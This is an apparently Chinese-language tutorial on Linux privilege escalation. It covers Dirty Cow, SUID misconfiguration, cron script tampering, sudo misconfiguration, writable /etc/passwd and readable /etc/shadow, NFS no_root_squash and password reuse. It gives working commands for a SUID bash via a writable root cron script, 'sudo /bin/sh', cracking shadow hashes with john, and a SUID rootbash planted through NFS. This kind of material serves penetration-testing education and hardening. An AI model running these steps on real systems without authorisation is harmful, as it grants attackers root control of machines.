<h3 class="md-end-block md-heading md-focus"><span class="md-plain">一、内核漏洞提权</span></h3>
<p class="md-end-block md-p"><span class="md-plain">内核漏洞是 Linux 提权的经典途径，其中 “脏牛（Dirty Cow）” 漏洞因影响范围广而具有代表性。</span></p>

<h5 class="md-end-block md-heading"><span class="md-plain">（一）漏洞简介</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">CVE 编号</span></strong></span><span class="md-plain">：CVE-2016-5195</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">原理</span></strong></span><span class="md-plain">：Linux 内核处理 “写入复制（copy-on-write）” 机制时存在竞争条件，允许恶意用户对只读内存映射进行写访问，进而篡改系统文件（如</span><span class="md-pair-s" spellcheck="false"><code>/etc/passwd</code></span><span class="md-plain">），提升至 root 权限。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">影响范围</span></strong></span><span class="md-plain">：近十年内的主流 Linux 发行版（RedHat、Debian、Ubuntu、CentOS 等）。</span></p>
</li>
</ul>

<h4 class="md-end-block md-heading"><span class="md-plain">二、SUID 配置错误提权</span></h4>
<p class="md-end-block md-p"><span class="md-plain">SUID（Set User ID）是一种特殊权限，允许执行者临时获得文件属主的权限。若 root 属主的二进制文件被错误配置 SUID，普通用户可借此提权。</span></p>

<h5 class="md-end-block md-heading"><span class="md-plain">（一）关键特性</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">仅二进制文件可设置 SUID，脚本文件无效；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">执行者需拥有该文件的执行（x）权限；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">权限仅在程序执行期间有效。</span></p>
</li>
</ul>
<h5 class="md-end-block md-heading"><span class="md-plain">（二）检测方法</span></h5>
<p class="md-end-block md-p"><span class="md-plain">查找所有具有 root 属主的 SUID 文件：</span></p>



```bash
chmod u+s FILE...   #对文件赋予 SUID 权限
find / -perm -u=s -type f 2>/dev/null  # 查找所有SUID文件
find / -user root -perm -4000 -print 2>/dev/null  # 仅root属主的SUID文件
```

<h4 class="md-end-block md-heading"><span class="md-plain">三、计划任务提权</span></h4>
<p class="md-end-block md-p"><span class="md-plain">系统计划任务（由</span><span class="md-pair-s" spellcheck="false"><code>crontab</code></span><span class="md-plain">管理）以所属用户权限运行。若 root 的计划任务存在权限漏洞（如脚本可被普通用户修改），可通过篡改脚本提权</span></p>

<h5 class="md-end-block md-heading"><span class="md-plain">（一）检测方法</span></h5>
<p class="md-end-block md-p"><span class="md-plain">查看系统级计划任务：</span></p>



```bash
ls -l /etc/cron*  # 列出所有计划任务目录
cat /etc/crontab  # 查看系统级计划任务
```


<h5 class="md-end-block md-heading"><span class="md-plain">（二）利用步骤</span></h5>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">发现可利用任务</span></strong></span><span class="md-plain">：找到 root 执行的计划任务（如</span><span class="md-pair-s" spellcheck="false"><code>/sbin/test.sh</code></span><span class="md-plain">），检查权限：</span></p>



```bash
ls -l /sbin/test.sh  # 若权限为777（所有人可读写），则可利用
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">篡改脚本</span></strong></span><span class="md-plain">：在脚本中添加 SUID 权限配置：</span></p>



```bash
echo 'cp /bin/bash /tmp/bash; chmod u+s /tmp/bash' > /sbin/test.sh
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">获取 root 权限</span></strong></span><span class="md-plain">：等待计划任务执行后，运行</span><span class="md-pair-s" spellcheck="false"><code>/tmp/bash -p</code></span><span class="md-plain">获取 root shell。</span></p>
</li>
</ol>
<h4 class="md-end-block md-heading"><span class="md-plain">四、sudo 提权</span></h4>
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>sudo</code></span><span class="md-plain">允许普通用户以 root 权限执行指定命令。若</span><span class="md-pair-s" spellcheck="false"><code>/etc/sudoers</code></span><span class="md-plain">配置不当（如免密码执行所有命令），普通用户可直接提权。</span></p>

<h5 class="md-end-block md-heading"><span class="md-plain">（一）检测方法</span></h5>
<p class="md-end-block md-p"><span class="md-plain">查看当前用户的 sudo 权限：</span></p>



```bash
sudo -l  # 查看当前用户可执行的sudo命令
```


<h5 class="md-end-block md-heading"><span class="md-plain">（二）利用场景</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">免密码配置</span></strong></span><span class="md-plain">：若</span><span class="md-pair-s" spellcheck="false"><code>/etc/sudoers</code></span><span class="md-plain">中存在</span><span class="md-pair-s" spellcheck="false"><code>用户名 ALL=(ALL:ALL) NOPASSWD:ALL</code></span><span class="md-plain">，允许用户无需密码执行所有命令：</span></p>



```bash
sudo /bin/sh  # 直接获取root shell
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">特定命令免密</span></strong></span><span class="md-plain">：若允许免密执行</span><span class="md-pair-s" spellcheck="false"><code>vim</code></span><span class="md-plain">，可通过</span><span class="md-pair-s" spellcheck="false"><code>vim</code></span><span class="md-plain">打开</span><span class="md-pair-s" spellcheck="false"><code>/etc/passwd</code></span><span class="md-plain">修改 root 密码。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">五、明文 root 密码提权</span></h4>
<p class="md-end-block md-p"><span class="md-plain">Linux 密码存储于</span><span class="md-pair-s" spellcheck="false"><code>/etc/passwd</code></span><span class="md-plain">（用户信息）和</span><span class="md-pair-s" spellcheck="false"><code>/etc/shadow</code></span><span class="md-plain">（密码 hash）。若两文件权限配置错误，可直接获取或修改 root 密码。</span></p>

<h5 class="md-end-block md-heading"><span class="md-plain">（一）利用方法</span></h5>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">修改</span><span class="md-pair-s" spellcheck="false"><code>/etc/passwd</code></span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">若文件可写（权限为 666），将 root 行的密码字段（x）替换为已知 hash（如</span><span class="md-pair-s" spellcheck="false"><code>root:$6$xxx...</code></span><span class="md-plain">，可通过</span><span class="md-pair-s" spellcheck="false"><code>openssl passwd -1 -salt abc 123</code></span><span class="md-plain">生成密码 hash）。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">爆破</span><span class="md-pair-s" spellcheck="false"><code>/etc/shadow</code></span></strong></span><span class="md-plain">：若文件可读，提取 root 的 hash 后用</span><span class="md-pair-s" spellcheck="false"><code>john</code></span><span class="md-plain">爆破：</span></p>



```bash
john --user=root shadow.txt  # 爆破密码（需提前安装john the ripper）
```


</li>
</ol>
<h4 class="md-end-block md-heading"><span class="md-plain">六、第三方服务提权（以 NFS 为例）</span></h4>
<p class="md-end-block md-p"><span class="md-plain">NFS（网络文件系统）允许客户端挂载服务器共享目录。若服务器配置</span><span class="md-pair-s" spellcheck="false"><code>no_root_squash</code></span><span class="md-plain">（客户端 root 权限不被压缩），客户端可创建 SUID 文件提权。</span></p>

<h5 class="md-end-block md-heading"><span class="md-plain">（一）检测方法</span></h5>
<p class="md-end-block md-p"><span class="md-plain">查看 NFS 共享配置：</span></p>



```bash
sudo showmount -e 目标IP  # 查看目标共享目录
```


<h5 class="md-end-block md-heading"><span class="md-plain">（二）利用步骤</span></h5>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">客户端挂载共享目录</span></strong></span><span class="md-plain">：</span></p>



```bash
sudo mkdir /tmp/nfs
sudo mount -t nfs 目标IP:/home/share /tmp/nfs  # 挂载共享目录
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">创建 SUID shell</span></strong></span><span class="md-plain">：</span></p>



```bash
cp /bin/bash /tmp/nfs/rootbash
chmod u+s /tmp/nfs/rootbash  # 设置SUID权限
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">在目标服务器提权</span></strong></span><span class="md-plain">：</span></p>



```bash
/home/share/rootbash -p  # 运行带SUID的bash，获取root权限
```


</li>
</ol>
<h4 class="md-end-block md-heading"><span class="md-plain">七、密码复用提权</span></h4>
<p class="md-end-block md-p"><span class="md-plain">管理员常复用密码（如数据库密码、web 后台密码与 root 密码相同）。获取低权限密码后，可尝试用于 root 登录。</span></p>

<h5 class="md-end-block md-heading"><span class="md-plain">（一）利用场景</span></h5>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">从数据库配置文件（如</span><span class="md-pair-s" spellcheck="false"><code>/var/www/config.php</code></span><span class="md-plain">）获取密码；</span></p>
</li>
 	<li class="md-list-item md-focus-container">
<p class="md-end-block md-p md-focus"><span class="md-plain">从 web 后台爆破或泄露的密码尝试</span><span class="md-pair-s" spellcheck="false"><code>su root</code></span><span class="md-plain">或</span><span class="md-pair-s" spellcheck="false"><code>ssh root@目标IP</code></span><span class="md-plain md-expand">。</span></p>
</li>
</ul>
